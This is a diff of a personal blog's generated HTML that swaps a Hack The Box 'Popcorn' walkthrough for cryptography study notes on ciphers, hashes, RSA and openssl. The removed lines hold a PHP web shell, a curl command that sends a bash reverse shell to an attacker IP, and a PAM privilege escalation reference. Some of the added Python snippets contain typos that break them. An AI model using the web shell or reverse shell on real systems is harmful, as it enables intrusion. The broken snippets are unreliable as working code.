@@ -42,27 +42,27 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.2.2" />
-<meta property="og:title" content="htb popcorn" />
+<meta property="og:title" content="cryptography" />
 <meta name="author" content="Yuchao" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="Recon" />
-<meta property="og:description" content="Recon" />
-<link rel="canonical" href="/posts/htb-popcorn/" />
-<meta property="og:url" content="/posts/htb-popcorn/" />
+<meta name="description" content="secret key encryption" />
+<meta property="og:description" content="secret key encryption" />
+<link rel="canonical" href="/posts/cryptography/" />
+<meta property="og:url" content="/posts/cryptography/" />
 <meta property="og:site_name" content="Yuchao Toolbox" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2021-03-15T11:33:00+08:00" />
+<meta property="article:published_time" content="2021-11-13T11:33:00+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="htb popcorn" />
+<meta property="twitter:title" content="cryptography" />
 <meta name="twitter:site" content="@0xZEN2" />
 <meta name="twitter:creator" content="@Yuchao" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-03-30T11:21:19+08:00","datePublished":"2021-03-15T11:33:00+08:00","description":"Recon","headline":"htb popcorn","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/htb-popcorn/"},"url":"/posts/htb-popcorn/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Yuchao"},"dateModified":"2022-05-12T23:00:22+08:00","datePublished":"2021-11-13T11:33:00+08:00","description":"secret key encryption","headline":"cryptography","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/cryptography/"},"url":"/posts/cryptography/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>htb popcorn | Yuchao Toolbox
+  <title>cryptography | Yuchao Toolbox
   </title>
 
   <!--
@@ -429,7 +429,7 @@
         
 
           
-            <span>htb popcorn</span>
+            <span>cryptography</span>
           
 
         
@@ -527,65 +527,6 @@
   
 
   
-    
-    
-
-    
-      
-        
-        
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-      
-
-      
-      
-
-      
-      
-      
-
-      
-
-    
-
-    
-
-  
 
   
   
@@ -603,6 +544,54 @@
       
         
         
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
       
 
       
@@ -716,7 +705,7 @@
 
 
 
-<h1 data-toc-skip>htb popcorn</h1>
+<h1 data-toc-skip>cryptography</h1>
 
 <div class="post-meta text-muted">
 
@@ -746,12 +735,12 @@
 -->
 
 <em class="timeago"
-    data-ts="1615779180"
+    data-ts="1636774380"
     
       data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
     
     >
-  2021-03-15
+  2021-11-13
 </em>
 
       </span>
@@ -766,12 +755,12 @@
 -->
 
 <em class="timeago"
-    data-ts="1648610479"
+    data-ts="1652367622"
     
       data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
     
     >
-  2022-03-29
+  2022-05-12
 </em>
 
       </span>
@@ -797,8 +786,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="301 words">
-  <em>1 min</em> read</span>
+  title="956 words">
+  <em>5 min</em> read</span>
 
 
       <!-- page views -->
@@ -810,130 +799,363 @@
 </div> <!-- .post-meta -->
 
 <div class="post-content">
-  <h2 id="recon"><span class="mr-2">Recon</span><a href="#recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+  <h1 id="secret-key-encryption">secret key encryption</h1>
 
-<h4 id="nmap"><span class="mr-2">nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.6
-nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> scans/tcpscripts 10.10.10.6
-</pre></td></tr></tbody></table></code></div></div>
+<p><code class="language-plaintext highlighter-rouge">tr 'a-z' 'A-Z' &lt;  test.txt</code> to upper case</p>
+
+<h4 id="encryption-mode-electronic-codebookecb-cipher-block-chaining-cbc-cipher-feedback-cfb-output-feedbackofb"><span class="mr-2">Encryption Mode: Electronic Codebook(ECB), Cipher-Block Chaining (CBC), Cipher Feedback (CFB), Output Feedback(OFB)</span><a href="#encryption-mode-electronic-codebookecb-cipher-block-chaining-cbc-cipher-feedback-cfb-output-feedbackofb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
 <ul>
-  <li>OpenSSH 5.1p1, Apache httpd 2.2.12  —&gt; older than Ubuntu Trusty 14.04 —&gt; Karmic (9.10)</li>
+  <li>ECB no IV, cypher with same pattern if plaintext same.</li>
+  <li>CBC with IV.</li>
+  <li>CFB stream encryption. plain text XOR with encrypted IV, so can encrypt bit by bit. feed cypher to next block.</li>
+  <li>OFB Output Feedback. feed encrypt IV (cypher before XOR) to next block.</li>
 </ul>
 
-<h4 id="directory-discovery"><span class="mr-2">Directory discovery</span><a href="#directory-discovery" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-2
-</pre></td><td class="rouge-code"><pre><span class="c"># directory discover</span>
-gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.6 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-o</span> scans/gobuster-root-med <span class="nt">-t</span> 40
-</pre></td></tr></tbody></table></code></div></div>
-<ul>
-  <li>get the path: /test (Status: 200) /index (Status: 200) /torrent (Status: 301) /rename (Status: 301)</li>
-  <li>show a PHP info page.</li>
-  <li><code class="language-plaintext highlighter-rouge">file_uploads</code> is set to ON</li>
-  <li>may vulnerable to Local File Inclusion.(LFI)</li>
-  <li>/torrent can upload image as screen shot</li>
-  <li>and the picture is saved at <code class="language-plaintext highlighter-rouge">http://10.10.10.6/torrent/upload/</code></li>
-</ul>
+<h4 id="padding-oracle"><span class="mr-2">padding oracle.</span><a href="#padding-oracle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
 
-<h2 id="upload-webshell"><span class="mr-2">upload webshell</span><a href="#upload-webshell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-<h4 id="manipulate-php-to-bypass-picture-filters"><span class="mr-2">manipulate php to bypass picture filters</span><a href="#manipulate-php-to-bypass-picture-filters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<ul>
-  <li>
-    <ol>
-      <li>file extension (the server did not have check this)</li>
-    </ol>
-  </li>
-  <li>
-    <ol>
-      <li>Content-Type header (this filter works on the server)</li>
-    </ol>
-  </li>
-  <li>
-    <ol>
-      <li>magic bytes (did not work)</li>
-    </ol>
-  </li>
-</ul>
+<h1 id="hash">hash</h1>
 
-<p>so just change the http header,
-add the php code before a png content in Burpsuite.</p>
-<div class="language-php highlighter-rouge"><div class="code-header">
-        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"cmd"</span><span class="p">]);</span><span class="cp">?&gt;</span>
-</pre></td></tr></tbody></table></code></div></div>
-
-<h4 id="upload"><span class="mr-2">upload</span><a href="#upload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<p>cmd.php seems to be rename as its hash value, as 0ba973670d943861fb9453eecefd3bf7d3054713.php.</p>
-
-<h4 id="execute"><span class="mr-2">execute</span><a href="#execute" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<p><code class="language-plaintext highlighter-rouge">curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php?cmd=id</code></p>
-
-<h2 id="reverse-shell"><span class="mr-2">reverse shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
-<p>webshell</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php <span class="nt">--data-urlencode</span> <span class="s2">"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.14/443 0&gt;&amp;1'"</span>
-</pre></td></tr></tbody></table></code></div></div>
-<p>attacker</p>
-<div class="language-bash highlighter-rouge"><div class="code-header">
-        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
-      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>nc <span class="nt">-lnvp</span> 443
-</pre></td></tr></tbody></table></code></div></div>
-<p>upgrade the shell</p>
 <div class="language-bash highlighter-rouge"><div class="code-header">
         <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
-</pre></td><td class="rouge-code"><pre>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
-^Z
-<span class="nb">stty </span>raw <span class="nt">-echo</span>
-<span class="nb">fg</span>
+</pre></td><td class="rouge-code"><pre><span class="nb">md5sum </span>file.txt
+<span class="nb">sha256sum </span>file.txt
+openssl dgst <span class="nt">-sha256</span> file.txt
+openssl sha256 file.txt
 </pre></td></tr></tbody></table></code></div></div>
 
-<h2 id="privesc"><span class="mr-2">privesc</span><a href="#privesc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>
+<div class="language-sql highlighter-rouge"><div class="code-header">
+        <span data-label-text="Sql"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">SHA2</span><span class="p">(</span><span class="s1">'message'</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span> <span class="c1">-- SHA-2 family of hash functions (SHA-224, SHA-256, SHA-384, and SHA-512).</span>
+</pre></td></tr></tbody></table></code></div></div>
 
-<h4 id="method-1-linux-pam-vulnerability"><span class="mr-2">Method 1: Linux PAM vulnerability</span><a href="#method-1-linux-pam-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
-<p>show the programs use PAM</p>
+<div class="language-python highlighter-rouge"><div class="code-header">
+        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="n">m</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">()</span>
+<span class="n">m</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="s">"message"</span><span class="p">)</span>
+<span class="n">m</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<div class="language-php highlighter-rouge"><div class="code-header">
+        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="k">echo</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">'sha256'</span><span class="p">,</span> <span class="s1">'message'</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nv">x</span><span class="o">=</span><span class="k">$((</span><span class="m">16#3200</span><span class="k">))</span>
+<span class="c"># x is 3200 in 16</span>
+<span class="nb">echo</span> <span class="nv">$x</span>
+<span class="c"># print x in 10</span>
+</pre></td></tr></tbody></table></code></div></div>
+
+<h4 id="hash-collision"><span class="mr-2">hash collision:</span><a href="#hash-collision" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>hash(A+B1+C) = hash(A+B2+C), if hash(A+B1) = hash(A+B2)</li>
+  <li>A+B1+B1+C, benign version</li>
+  <li>A+B1+B2+C, malicious version</li>
+  <li>C: if(b1=b2) benign code or malicious code.</li>
+  <li>benign and malicious version of softwares have same hash value.</li>
+</ul>
+
+<h4 id="mac-hash-length-extension-attack"><span class="mr-2">MAC: Hash Length Extension Attack.</span><a href="#mac-hash-length-extension-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>
+    <div class="table-wrapper"><table>
+      <tbody>
+        <tr>
+          <td>Hash( K</td>
+          <td> </td>
+          <td>S+MS) = Hash ( Hash( K</td>
+          <td> </td>
+          <td>S) + MS )</td>
+        </tr>
+      </tbody>
+    </table></div>
+  </li>
+  <li>so we can add Malicious String behind.</li>
+</ul>
+
+<h4 id="hmac-add-a-layer-of-hash-with-opad-and-ipad"><span class="mr-2">HMAC: add a layer of hash with opad and ipad.</span><a href="#hmac-add-a-layer-of-hash-with-opad-and-ipad" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>avoid Hash Length Extention Attack.</li>
+  <li><code class="language-plaintext highlighter-rouge">echo -n "a messsage" | openssl dgst -sha256 -hmac "secretkey"</code></li>
+  <li>culculate hmac based on sha256 algorithm</li>
+</ul>
+
+<h1 id="public-key-cryptography">public-key cryptography</h1>
+
+<h4 id="diffie-hellman-key-exchange"><span class="mr-2">diffie-hellman key exchange</span><a href="#diffie-hellman-key-exchange" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>A,B gree on g (can be small), p (very large)</li>
+  <li>A keeps X, B keeps Y</li>
+  <li>A send B:    g^X mod p, B can not find X</li>
+  <li>B send A:    g^Y mod p, A can not find Y</li>
+  <li>B culculate: (g^X mod p) ^ Y mod p = g ^ (xy) mod p</li>
+  <li>A culculate: (g^Y mod p) ^ X mod p = g ^ (yx) mod p</li>
+  <li>get common secret number, through open channel.</li>
+</ul>
+
+<h4 id="turn-diffie-hellman-to-public-key-encrytion"><span class="mr-2">turn diffie-hellman to public key encrytion</span><a href="#turn-diffie-hellman-to-public-key-encrytion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>private key of A: x.</li>
+  <li>public key of A: g, p,  g^x mod p.</li>
+  <li>B encrypt message by g^xy mod p. y is secret of B.</li>
+  <li>B send A: 1. g^y mod p, and 2. secret message.</li>
+</ul>
+
+<h4 id="rsa"><span class="mr-2">RSA</span><a href="#rsa" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+
+<p>n = p*q, RSA based on: if know n, can not find p and q.</p>
+
+<p>Euler`s Theorem</p>
+<ul>
+  <li>Φ(n): number of positive integer up to n, that are relatively prime to n.</li>
+  <li>Φ(p) = p-1, if p is prime.</li>
+  <li>Φ(m*n) = Φ(m) * Φ(n), if m,n are co-prime.</li>
+  <li>Φ(p<em>q) = (p-1)</em>(q-1), if p,q are prime.</li>
+  <li>a^Φ(n) = 1 (mod n), if a,n are co-prime.</li>
+</ul>
+
+<p>Example</p>
+<ul>
+  <li>4^100003 mod 33 = ?</li>
+  <li>Φ(33) = 2*10 = 20</li>
+  <li>4^20 mod 33 = 1</li>
+</ul>
+
+<p>Extended Euclidean Algorithm</p>
+<ul>
+  <li>if a<em>x + b</em>y = gcd(a,b) = 1</li>
+  <li>then a*x = 1 (mod b)</li>
+  <li>x is the inverse of a, in mod b.</li>
+  <li>public key, private key, inverse each other.</li>
+</ul>
+
+<p>RSA Algorithm</p>
+<ul>
+  <li>find e, a prime. mostly 65537. as public key</li>
+  <li>find 2 large prime number: p, q. n=p*q. e and Φ(n) are co-prime.</li>
+  <li>find d, e*d = 1 mod Φ(n), d as secret key.</li>
+  <li>if know p,q, can easily find d; if only know n, very difficult.</li>
+  <li>Message ^ e (mod n) = Cryptedtext.</li>
+  <li>e, n are public.</li>
+  <li>p, q, Φ(n), d are secret.</li>
+  <li>Cryptedtext ^ d (mod n) = Message.</li>
+</ul>
+
+<p>why</p>
+<ul>
+  <li>a is M encrypt then decrypt.</li>
+  <li>a= M^(ed) mod n</li>
+  <li>ed = k * Φ(n) + 1</li>
+  <li>a= M ^ (k * Φ(n)) * M mod n</li>
+  <li>as M ^ Φ(n) = 1 mod n</li>
+  <li>a = M</li>
+</ul>
+
+<p>note</p>
+<ul>
+  <li>message can not be longer than n.</li>
+</ul>
+
+<p>openssl and RSA</p>
+<ul>
+  <li>generate RSA keys, encrypted by aes128 and encoded by base64</li>
+  <li><code class="language-plaintext highlighter-rouge">openssl genrsa -aes128 -out private.pem 1024</code></li>
+  <li>view private key</li>
+  <li><code class="language-plaintext highlighter-rouge">openssl rsa -in private.pem -noout -text</code></li>
+  <li>get public key</li>
+  <li><code class="language-plaintext highlighter-rouge">openssl rsa -in private.pem -pubout &gt; public.pem</code></li>
+  <li>view public key</li>
+  <li><code class="language-plaintext highlighter-rouge">openssl rsa -in public.epm -pubin -text -noout</code></li>
+  <li>encrypt msg.txt to msg.enc</li>
+  <li><code class="language-plaintext highlighter-rouge">openssl rsautl -encrypt -inkey public.pem -pubin -in msg.txt -out msg.enc</code></li>
+  <li>decrypt</li>
+  <li><code class="language-plaintext highlighter-rouge">openssl rsautl -decrypt -inkey private.pem -in msg.enc</code></li>
+</ul>
+
+<p>strength</p>
+<ul>
+  <li>1024-bit RSA keys = 80-bit symmetric keys</li>
+  <li>2048-bit RSA keys = 112-bit symmetric keys</li>
+  <li>3072-bit RSA keys = 128-bit symmetric keys</li>
+</ul>
+
+<p>test speed</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">openssl speed rsa</code></li>
+  <li><code class="language-plaintext highlighter-rouge">openssl speed aes-128-cbc</code></li>
+</ul>
+
+<h4 id="rsa-padding"><span class="mr-2">RSA padding</span><a href="#rsa-padding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li>like IV in symmtric encryption.</li>
+  <li><code class="language-plaintext highlighter-rouge">openssl rsautl -encrypt... -pkcs</code> use PKCS padding (default)</li>
+  <li><code class="language-plaintext highlighter-rouge">openssl rsautl -decrypt... -raw</code> see the padding information</li>
+  <li>better and secure padding, oaep</li>
+  <li><code class="language-plaintext highlighter-rouge">openssl rsautl -encrypt... -oaep</code></li>
+</ul>
+
+<h4 id="digital-signature"><span class="mr-2">Digital Signature</span><a href="#digital-signature" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">openssl sha256 -binary msg.txt &gt; msg.sha256</code></li>
+  <li><code class="language-plaintext highlighter-rouge">openssl rsautl -sign -inkey private.pem -in msg.sha256 -out msg.sig</code></li>
+  <li><code class="language-plaintext highlighter-rouge">openssl rsautl -verify -inkey public.pem -in msg.sig -pubin -raw | xxd</code></li>
+</ul>
+
+<h4 id="program"><span class="mr-2">program</span><a href="#program" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<p>cryptography library</p>
+<ul>
+  <li><a href="https://cryptography.io/en/latest/">https://cryptography.io/en/latest/</a></li>
+</ul>
+
+<p>Usage</p>
+<ul>
+  <li>Key Generation
+```python
+#!/usr/bin/python3</li>
+</ul>
+
+<p>from Crypto.PublicKey import RSA</p>
+
+<p>key = RSA.generate(2048) # key length
+pem = key.export_key(format=’PEM’, passphrase=’ddd’)
+f = open(‘private.pem’, ‘wb’)
+f.write(pem)
+f.close()</p>
+
+<p>pub = key.publickey()
+pub_pem = pub.export_key(format=’PEM’)
+f = open(‘public.pem’, ‘wb’)
+f.write(pub_pem)
+f.close()</p>
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre></td><td class="rouge-code"><pre>$ ls /etc/pam.d 
-chfn common-account common-session lightdm login passwd runuser sshd  su-l chpasswd  common-auth common-session-noninteractive lightdm-autologin newusers polkit-1 runuser-l su
-chsh common-password  cron lightdm-greeter other ppp samba sudo
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>- Encryption
+```python
+#!/usr/bin/python3
+
+from Crypto.Cipher imprt PKCS1_OAEP
+from Crypto.PublicKey import RSA
+
+message = b'a secret message\n'
+
+key = RSA.importKey(open('public.pem').read())
+cipher = PKCS1_OAEP.new(key)
+ciphertext = cipher.encrypt(messagge)
+f = open('ciphertext.bin', 'wb')
+f.write(ciphertext)
+f.close()
 </pre></td></tr></tbody></table></code></div></div>
-<p>The pam modules directory. Can be configured to the programs above</p>
+<ul>
+  <li>Decryption
+```python
+#!/usr/bin/python3</li>
+</ul>
+
+<p>from Crypto.Cipher imprt PKCS1_OAEP
+from Crypto.PublicKey import RSA</p>
+
+<p>ciphertext = open(‘ciphertext.bin’, ‘rb’).read()
+prikey_pem = open(‘private.pem’).read()
+prikey = RSA.importKey(prikey_pem, passphrase=’ddd’)
+cipher = PKCS1_OAEP.new(prikey)
+message = cipher.decrypt(ciphertext)
+print(message)</p>
 <div class="language-plaintext highlighter-rouge"><div class="code-header">
         <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>/usr/lib/x86_64-linux-gnu/security
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre>- Sign
+```phtyon
+# Probabilistic Signature Scheme (PSS) 
+from Crypto.Signature import pss
+from Crypto.Hash import SHA256
+from Crypto.PublicKey import RSA
+
+message = b'this is a message'
+key_pem = open('private.pem').read()
+key = RSA.import_key(key_pem, passphrase='ddd')
+h = SHA256.new(message)
+signer = pss.new(key)
+signature = signer.sign(h)
+open('signature.bin', 'wb').write(signature)
 </pre></td></tr></tbody></table></code></div></div>
-<p>at user<code class="language-plaintext highlighter-rouge">s file
-</code><code class="language-plaintext highlighter-rouge">find . -type f -ls</code><code class="language-plaintext highlighter-rouge">
-</code><code class="language-plaintext highlighter-rouge">/.cache/motd.legal-displayed</code>` looks interesting.</p>
 <ul>
-  <li>Googling for “motd.legal-displayed privesc”</li>
-  <li>https://www.exploit-db.com/exploits/14339</li>
-  <li>Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation</li>
-  <li>PAM will create <code class="language-plaintext highlighter-rouge">.cache/motd.legal-displayed</code> when login.</li>
-  <li>https://askubuntu.com/questions/256020/how-can-i-stop-the-automatic-creation-of-cache-motd-legal-displayed-file</li>
-  <li>sshd use pam to authenticate, so we need to ssh to the box.(as www-data)</li>
+  <li>Verify
+    <div class="language-python highlighter-rouge"><div class="code-header">
+        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'this is a message'</span>
+<span class="n">signature</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'signature.bin'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="p">.</span><span class="n">import_key</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">'public.pem'</span><span class="p">).</span><span class="n">read</span><span class="p">())</span>
+<span class="n">h</span> <span class="o">=</span> <span class="n">SHA256</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
+<span class="n">verifier</span> <span class="o">=</span> <span class="n">pss</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+<span class="k">try</span><span class="p">:</span>
+  <span class="n">verifier</span><span class="p">.</span><span class="n">verify</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">signature</span><span class="p">)</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">'valid'</span><span class="p">)</span>
+<span class="k">except</span> <span class="p">(</span><span class="nb">ValueError</span><span class="p">,</span> <span class="nb">TypeError</span><span class="p">):</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">'Not Valid'</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></div>    </div>
+  </li>
 </ul>
 
-<h4 id="method-2-dirty-cow"><span class="mr-2">Method 2: Dirty Cow</span><a href="#method-2-dirty-cow" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4>
+<h1 id="pki">PKI</h1>
 
+<h1 id="tls">TLS</h1>
+
+<h1 id="bitcoin">Bitcoin</h1>
 
 </div>
 
@@ -953,14 +1175,8 @@ chsh common-password  cron lightdm-greeter other ppp samba sudo
   <div class="post-tags">
     <i class="fa fa-tags fa-fw mr-1"></i>
       
-      <a href="/tags/htb/"
-          class="post-tag no-text-decoration" >htb</a>
-      
-      <a href="/tags/pam/"
-          class="post-tag no-text-decoration" >pam</a>
-      
-      <a href="/tags/dirtycow/"
-          class="post-tag no-text-decoration" >dirtycow</a>
+      <a href="/tags/cryptography/"
+          class="post-tag no-text-decoration" >cryptography</a>
       
   </div>
   
@@ -995,19 +1211,19 @@ chsh common-password  cron lightdm-greeter other ppp samba sudo
 
     
       
-        <a href="https://twitter.com/intent/tweet?text=htb+popcorn+-+Yuchao+Toolbox&url=%2Fposts%2Fhtb-popcorn%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://twitter.com/intent/tweet?text=cryptography+-+Yuchao+Toolbox&url=%2Fposts%2Fcryptography%2F" data-toggle="tooltip" data-placement="top"
           title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
           <i class="fa-fw fab fa-twitter"></i>
         </a>
     
       
-        <a href="https://www.facebook.com/sharer/sharer.php?title=htb+popcorn+-+Yuchao+Toolbox&u=%2Fposts%2Fhtb-popcorn%2F" data-toggle="tooltip" data-placement="top"
+        <a href="https://www.facebook.com/sharer/sharer.php?title=cryptography+-+Yuchao+Toolbox&u=%2Fposts%2Fcryptography%2F" data-toggle="tooltip" data-placement="top"
           title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
           <i class="fa-fw fab fa-facebook-square"></i>
         </a>
     
       
-        <a href="https://t.me/share/url?url=%2Fposts%2Fhtb-popcorn%2F&text=htb+popcorn+-+Yuchao+Toolbox" data-toggle="tooltip" data-placement="top"
+        <a href="https://t.me/share/url?url=%2Fposts%2Fcryptography%2F&text=cryptography+-+Yuchao+Toolbox" data-toggle="tooltip" data-placement="top"
           title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
           <i class="fa-fw fab fa-telegram"></i>
         </a>
